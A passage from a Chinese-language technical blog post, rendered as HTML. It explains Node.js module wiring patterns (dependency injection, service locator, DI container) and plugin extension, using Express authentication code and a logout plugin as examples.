modules(连接模块的模式)</h2><h3 id="Hardcoded-dependency-硬编码依赖"><a href="#Hardcoded-dependency-硬编码依赖" class="headerlink" title="Hardcoded dependency(硬编码依赖)"></a>Hardcoded dependency(硬编码依赖)</h3><p><img src="/assets/img/hardcoded_dependency.png" alt="Hardcoded denpendency"></p><p>从图中可以发现，硬编码依赖就是一层层依赖下来，从模块中直接导出有状态的实例，最原始的方案。</p><p>优点：管理起来非常直观，易于理解和调试，每个模块初始化和引入，都不会受到任何外部条件的干预。</p><p>缺点：限制将模块与其他实例关联的可能性，这使得在单元测试的过程中，其可重用性更低，测试难度更大。</p><h3 id="Dependency-injection-依赖注入"><a href="#Dependency-injection-依赖注入" class="headerlink" title="Dependency injection(依赖注入)"></a>Dependency injection(依赖注入)</h3><p>依赖注入模式背后的主要思想是由外部实体提供输入的组件的依赖关系。这样的实体可以是客户端组件或全局容器，它集中了系统所有模块的关联。这种方法的主要优点是解耦，特别是对于取决于有状态实例的模块。</p><p>可以使用工厂来创建有状态的实例，然后将实例注入组件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> errorHandler = <span class="built_in">require</span>(<span class="string">'errorhandler'</span>)</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = (<span class="built_in">module</span>.exports = <span class="keyword">new</span> Express())</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> dbFactory = <span class="built_in">require</span>(<span class="string">'./lib/db'</span>)</span><br><span class="line"><span class="keyword">const</span> authServiceFactory = <span class="built_in">require</span>(<span class="string">'./lib/authService'</span>)</span><br><span class="line"><span class="keyword">const</span> authControllerFactory = <span class="built_in">require</span>(<span class="string">'./lib/authController'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> db = dbFactory(<span class="string">'example-db'</span>)</span><br><span class="line"><span class="keyword">const</span> authService = authServiceFactory(db, <span class="string">'SHHH!'</span>)</span><br><span class="line"><span class="keyword">const</span> authController = authControllerFactory(authService)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/login'</span>, authController.login)</span><br><span class="line">app.get(<span class="string">'/checkToken'</span>, authController.checkToken)</span><br><span class="line"></span><br><span class="line">app.use(errorHandler())</span><br><span class="line">http.createServer(app).listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'Express server started'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>当然还有其他注入的方式，比如构造函数注入和属性注入。</p><p>构造函数注入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> service = <span class="keyword">new</span> Service(dependencyA, dependencyB)</span><br></pre></td></tr></table></figure><p>属性注入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> service = <span class="keyword">new</span> Service()</span><br><span class="line">service.dependencyA = anInstanceOfDependencyA</span><br></pre></td></tr></table></figure><blockquote><p>注意属性注入会导致实例的不一致状态，创建时的初始状态和设置依赖后的状态。但是当存在依赖循环时就很有用了，比如有两个组件 <code>A</code> 和 <code>B</code>，它们都使用工厂或构造函数注入，并且都相互依赖，我们不能实例化它们中的任何一个，因为两者都需要另一个存在才能被创建。</p></blockquote><p>举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Afactory</span>(<span class="params">b</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    foo: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      b.say()</span><br><span class="line">    &#125;,</span><br><span class="line">    what: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'Hello!'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Bfactory</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    a: a,</span><br><span class="line">    say: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'I say: '</span> + a.what)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里先创建一个不完整的B，再使用这个b实例创建A的实例，最后再反过来设置b的依赖</span></span><br><span class="line"><span class="keyword">const</span> b = Bfactory(<span class="literal">null</span>)</span><br><span class="line"><span class="keyword">const</span> a = Afactory(b)</span><br><span class="line">a.b = b</span><br></pre></td></tr></table></figure><blockquote><p>依赖倒置通常还会提到 <code>DIP</code>(Dependency Inversion Principle，依赖倒置原则) 和 <code>IoC</code>(Inversion of Control，控制反转)。依赖倒置就是原来都是高层组件依赖底层组件，针对不同的底层组件实现不同的接口，倒置就是定义好高层组件的接口，而让底层组件去实现接口，这样当新加了底层组件的时候就不用修改高层组件的代码了。控制反转一种重要的方式，就是将依赖对象的创建和绑定转移到被依赖对象类的外部来实现，就像上面的代码一样 <code>authService</code> 需要依赖 <code>db</code> 那么这个建立依赖的过程却交给 <code>authController</code> 来处理了，这样能很好地将 <code>Service</code> 与 <code>DB</code> 解耦。</p></blockquote><h3 id="Service-locator-服务定位器"><a href="#Service-locator-服务定位器" class="headerlink" title="Service locator(服务定位器)"></a>Service locator(服务定位器)</h3><p>服务定位器核心原则是拥有一个中央注册中心，以便管理系统组件，并在模块需要加载依赖时作为中介，但是要求连接的是使用依赖注入的模块。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> dependencies = &#123;&#125;</span><br><span class="line">  <span class="keyword">const</span> factories = &#123;&#125;</span><br><span class="line">  <span class="keyword">const</span> serviceLocator = &#123;&#125;</span><br><span class="line"></span><br><span class="line">  serviceLocator.factory = <span class="function">(<span class="params">name, factory</span>) =&gt;</span> &#123;</span><br><span class="line">    factories[name] = factory</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  serviceLocator.register = <span class="function">(<span class="params">name, instance</span>) =&gt;</span> &#123;</span><br><span class="line">    dependencies[name] = instance</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  serviceLocator.get = <span class="function"><span class="params">name</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!dependencies[name]) &#123;</span><br><span class="line">      <span class="keyword">const</span> factory = factories[name]</span><br><span class="line">      dependencies[name] = factory &amp;&amp; factory(serviceLocator)</span><br><span class="line">      <span class="keyword">if</span> (!dependencies[name]) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Cannot find module: '</span> + name)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dependencies[name]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> serviceLocator</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用</span></span><br><span class="line"><span class="keyword">const</span> svcLoc = <span class="built_in">require</span>(<span class="string">'./lib/serviceLocator'</span>)()</span><br><span class="line"></span><br><span class="line">svcLoc.register(<span class="string">'dbName'</span>, <span class="string">'example-db'</span>)</span><br><span class="line">svcLoc.factory(<span class="string">'db'</span>, <span class="built_in">require</span>(<span class="string">'./lib/db'</span>))</span><br><span class="line">svcLoc.factory(<span class="string">'authService'</span>, <span class="built_in">require</span>(<span class="string">'./lib/authService'</span>))</span><br><span class="line">svcLoc.factory(<span class="string">'authController'</span>, <span class="built_in">require</span>(<span class="string">'./lib/authController'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> authController = svcLoc.get(<span class="string">'authController'</span>)</span><br></pre></td></tr></table></figure><p>想要更换依赖只需要更改注册的实例或者工厂函数即可，之后便可通过 <code>get(name)</code> 来获得定制好的对应实例。这里还可以将这些参数写成配置，那么就可以不动代码只改写配置就能完成依赖的替换了。</p><p>服务定位器惰性加载模块。每个实例仅在需要时创建。还有另一个重要的含义：事实上，我们可以看到，每个依赖关系都是自动连接的，无需手动完成。好处是我们不必事先知道实例化和连接模块的正确顺序是什么 - 这一切都是自动和按需进行的。与简单的依赖注入模式相比，这更方便。</p><p>与依赖注入的区别：</p><ul><li>可重用性：依赖于服务定位器的组件不易重用，因为它要求系统中有一个服务定位器。</li><li>可读性：正如我们已经说过的，服务定位器混淆了组件的依赖性要求。</li></ul><h3 id="Dependency-injection-container-依赖注入容器"><a href="#Dependency-injection-container-依赖注入容器" class="headerlink" title="Dependency injection container(依赖注入容器)"></a>Dependency injection container(依赖注入容器)</h3><p>和服务定位器十分类似，只不过不用传递 <code>locator</code> 对象到模块中，而是通过某些手段(如参数名，导出模块的其他配置项)来声明所需要的依赖，之后便会自动注入。看一个具体例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里直接使用参数名声明所需要的依赖</span></span><br><span class="line"><span class="comment">//authService.js，声明需要一个db依赖和一个tokenSecret依赖</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">db, tokenSecret</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也可以使用其他方法声明，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;&#125;</span><br><span class="line"><span class="built_in">module</span>.exports._inject = [<span class="string">'db'</span>, <span class="string">'tokenSecret'</span>]</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;&#125;</span><br><span class="line"><span class="built_in">module</span>.exports._inject = [<span class="string">'db'</span>, <span class="string">'tokenSecret'</span>]</span><br></pre></td></tr></table></figure><p>接着就是我们的依赖注入容器了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fnArgs = <span class="built_in">require</span>(<span class="string">'parse-fn-args'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> dependencies = &#123;&#125;</span><br><span class="line">  <span class="keyword">const</span> factories = &#123;&#125;</span><br><span class="line">  <span class="keyword">const</span> diContainer = &#123;&#125;</span><br><span class="line"></span><br><span class="line">  diContainer.factory = <span class="function">(<span class="params">name, factory</span>) =&gt;</span> &#123;</span><br><span class="line">    factories[name] = factory</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  diContainer.register = <span class="function">(<span class="params">name, dep</span>) =&gt;</span> &#123;</span><br><span class="line">    dependencies[name] = dep</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  diContainer.get = <span class="function"><span class="params">name</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!dependencies[name]) &#123;</span><br><span class="line">      <span class="keyword">const</span> factory = factories[name]</span><br><span class="line">      dependencies[name] = factory &amp;&amp; diContainer.inject(factory)</span><br><span class="line">      <span class="keyword">if</span> (!dependencies[name]) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Cannot find module: '</span> + name)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dependencies[name]</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  diContainer.inject = <span class="function"><span class="params">factory</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> args = fnArgs(factory).map(<span class="function"><span class="keyword">function</span>(<span class="params">dependency</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> diContainer.get(dependency)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> factory.apply(<span class="literal">null</span>, args)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> diContainer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//app.js</span></span><br><span class="line"><span class="keyword">const</span> Express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> errorHandler = <span class="built_in">require</span>(<span class="string">'errorhandler'</span>)</span><br><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = (<span class="built_in">module</span>.exports = <span class="keyword">new</span> Express())</span><br><span class="line">app.use(bodyParser.json())</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> diContainer = <span class="built_in">require</span>(<span class="string">'./lib/diContainer'</span>)()</span><br><span class="line"></span><br><span class="line">diContainer.register(<span class="string">'dbName'</span>, <span class="string">'example-db'</span>)</span><br><span class="line">diContainer.register(<span class="string">'tokenSecret'</span>, <span class="string">'SHHH!'</span>)</span><br><span class="line">diContainer.factory(<span class="string">'db'</span>, <span class="built_in">require</span>(<span class="string">'./lib/db'</span>))</span><br><span class="line">diContainer.factory(<span class="string">'authService'</span>, <span class="built_in">require</span>(<span class="string">'./lib/authService'</span>))</span><br><span class="line">diContainer.factory(<span class="string">'authController'</span>, <span class="built_in">require</span>(<span class="string">'./lib/authController'</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> authController = diContainer.get(<span class="string">'authController'</span>)</span><br></pre></td></tr></table></figure><p>和服务定位器不同的就是创建实例的地方，不是直接调用工厂函数，而是通过 <code>inject</code> 来自动获取某个模块所需要的依赖，并自动创建出依赖实例，然后将这些实例作为参数传递个这个模块的工厂函数。拿 <code>authService</code> 来说，取到 <code>authService</code> 的工厂函数的参数列表 <code>[db, tokenSecret]</code>，然后就去取对应的这两个的实例，<code>db</code> 的实例取到 <code>example-db</code> 的数据块实例，<code>tokenSecret</code> 就直接取到了 <code>SHHH!</code>，然后再把取到的数据库实例和 <code>SHHH!</code> 作为参数传递给 <code>authService</code> 的工厂函数从而构造出 <code>authService</code> 的实例。</p><blockquote><p>具体是使用 <strong>服务定位器</strong> 还是 <strong>依赖注入容器</strong> 就取决于你自己了，只是使用的方式不一样而已，都是用来实现控制反转的且都是基于模块本身是依赖注入的。</p></blockquote><h2 id="Wiring-plugins-连接插件"><a href="#Wiring-plugins-连接插件" class="headerlink" title="Wiring plugins(连接插件)"></a>Wiring plugins(连接插件)</h2><p>软件工程的架构都希望拥有一个最小功能，其他的功能通过插件来补充。但是会因为时间、资源、复杂度上的限制使得没有那么容易达成这个目标。尽管如此我们还是希望通过插件来扩展系统，我们关注两个问题：</p><ul><li>将应用程序服务暴露给插件</li><li>将插件集成到应用程序中</li></ul><h3 id="Plugins-as-packages-包装插件成包"><a href="#Plugins-as-packages-包装插件成包" class="headerlink" title="Plugins as packages(包装插件成包)"></a>Plugins as packages(包装插件成包)</h3><p>通常来说插件会作为包安装到 <code>node_modules</code> 目录中。这样做有两个好处，首先，我们可以利用 npm 的功能来分发插件并管理它的依赖关系。其次，一个包可以有自己的私有依赖关系图，这样可以减少依赖关系之间发生冲突和不兼容的可能性，而不是让插件使用父项目的依赖关系。</p><p>有些插件是有状态的，因为插件有时候也需要用到父项目的一些服务。</p><h3 id="Extension-points-扩展点"><a href="#Extension-points-扩展点" class="headerlink" title="Extension points(扩展点)"></a>Extension points(扩展点)</h3><p>有很多种方法可以是的我们程序变得可扩展，例如代理模式、装饰者模式，而重要的是找到扩展点。</p><h3 id="Plugin-controlled-vs-application-controlled-extension-插件控制扩展-vs-应用控制扩展"><a href="#Plugin-controlled-vs-application-controlled-extension-插件控制扩展-vs-应用控制扩展" class="headerlink" title="Plugin-controlled vs application-controlled extension(插件控制扩展 vs 应用控制扩展)"></a>Plugin-controlled vs application-controlled extension(插件控制扩展 vs 应用控制扩展)</h3><p>主要有两种方式去扩展一个应用的组件：</p><ul><li>直接扩展</li><li>通过 <code>IoC</code>(控制反转) 扩展</li></ul><p><img src="/assets/img/extension_points.png" alt="Extension points"></p><p>可以看到直接扩展就是一个特定组件直接控制基础设施，而第二种就是基础设施通过加载、安装、执行特定组件来完成控制扩展。</p><p>将这两种方法应用到插件就是 “插件控制扩展” 和 “应用控制扩展”了。</p><p>插件控制扩展例子，插件接收应用作为参数，然后对扩展点进行扩展：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in the application</span></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'thePlugin'</span>)(app)</span><br><span class="line"><span class="comment">//in the plugin</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">plugin</span>(<span class="params">app</span>) </span>&#123;</span><br><span class="line">  app.get(<span class="string">'/newRoute'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;...&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>应用控制扩展例子，是直接在应用中使用 <code>plugin</code> 来扩展：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//in the application</span></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line"><span class="keyword">const</span> plugin = <span class="built_in">require</span>(<span class="string">'thePlugin'</span>)()</span><br><span class="line">app[plugin.method](plugin.route, plugin.handler)</span><br><span class="line"><span class="comment">//in the plugin</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span> <span class="title">plugin</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    method: <span class="string">'get'</span>,</span><br><span class="line">    route: <span class="string">'/newRoute'</span>,</span><br><span class="line">    handler: <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两种方式的不同：</p><ul><li><p>插件控制扩展更加强大和灵活，因为插件能获取到应用内部的内容，如果插件原来就是应用的一部分那么也是很容易抽离出插件的，不用更改多少的代码。但是这种方式可能有更多的不利，实际上，应用中的任何改动很容就间接影响到插件，使得插件得不断地更新。</p></li><li><p>插件控制扩展没啥要求，而应用控制扩展则需要插件具有一个基础结构(上面类似于 <code>method</code>,<code>route</code>,<code>handler</code>这些东西)。</p></li><li><p>插件控制扩展必须得共享应用实例，否则就做不到扩展。而应用控制扩展可能只需要共享应用的一部分服务。</p></li></ul><h3 id="Implementing-a-logout-plugin-实现一个日志插件"><a href="#Implementing-a-logout-plugin-实现一个日志插件" class="headerlink" title="Implementing a logout plugin(实现一个日志插件)"></a>Implementing a logout plugin(实现一个日志插件)</h3><h4 id="Exposing-services-using-a-service-locator-使用服务定位器暴露服务"><a href="#Exposing-services-using-a-service-locator-使用服务定位器暴露服务" class="headerlink" title="Exposing services using a service locator(使用服务定位器暴露服务)"></a>Exposing services using a service locator(使用服务定位器暴露服务)</h4><p>这就是使用插件控制扩展的实现。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//plugin-logou/index.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="params">serviceLocator</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> authSerive = serviceLocator.get(<span class="string">'authService'</span>)</span><br><span class="line">  <span class="keyword">const</span> db = serviceLocator.get(<span class="string">'db'</span>)</span><br><span class="line">  <span class="keyword">const</span> app = serviceLocator.get(<span class="string">'app'</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> tokensDb = db.sublevel(<span class="string">'tokens'</span>)</span><br><span class="line">  <span class="keyword">const</span> oldLogin = authService.login</span><br><span class="line">  authService.login = <span class="function">(<span class="params">username, password, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//...same as in the previous version</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> oldCheckToken = authService.checkToken</span><br><span class="line">  authService.checkToken = <span class="function">(<span class="params">token, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//...same as in the previous version</span></span><br><span class="line">  &#125;</span><br><span class="line">  authService.logout = <span class="function">(<span class="params">token, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//...same as in the previous version</span></span><br><span class="line">  &#125;</span><br><span class="line">  app.get(<span class="string">'/logout'</span>, (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="comment">//...same as in the previous version</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">const svcLoc = require('./lib/serviceLocator')()</span></span><br><span class="line"><span class="comment">svcLoc.register(...)</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line">svcLoc.register(<span class="string">'app'</span>, app)</span><br><span class="line"><span class="keyword">const</span> plugin = <span class="built_in">require</span>(<span class="string">'plugin-logout'</span>)</span><br><span class="line">plugin(svcLoc)</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure><p>过程：注册 <code>app</code> 本身到服务定位器，因为插件可能需要用到 <code>app</code> 中的某些服务；引入插件；调用插件的主函数，服务定位器作为参数。</p><h4 id="Exposing-services-using-DI-container-使用依赖注入容器暴露服务"><a href="#Exposing-services-using-DI-container-使用依赖注入容器暴露服务" class="headerlink" title="Exposing services using DI container(使用依赖注入容器暴露服务)"></a>Exposing services using DI container(使用依赖注入容器暴露服务)</h4><p>这就是使用应用控制扩展的实现。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//plugin-logout/index.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">app, authSercice, db</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> tokensDb = db.sublevel(<span class="string">'tokens'</span>)</span><br><span class="line">  <span class="keyword">const</span> oldLogin = authService.login</span><br><span class="line">  authService.login = <span class="function">(<span class="params">username, password, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//...same as in the previous version</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> oldCheckToken = authService.checkToken</span><br><span class="line">  authService.checkToken = <span class="function">(<span class="params">token, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//...same as in the previous version</span></span><br><span class="line">  &#125;</span><br><span class="line">  authService.logout = <span class="function">(<span class="params">token, callback</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//...same as in the previous version</span></span><br><span class="line">  &#125;</span><br><span class="line">  app.get(<span class="string">'/logout'</span>, (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="comment">//...same as in the previous version</span></span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="keyword">const</span> diContainer = <span class="built_in">require</span>(<span class="string">'./lib/diContainer'</span>)(); diContainer.register(...);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="comment">//initialize the plugin</span></span><br><span class="line">diContainer.inject(<span class="built_in">require</span>(<span class="string">'plugin-logout'</span>))</span><br><span class="line"><span class="comment">// 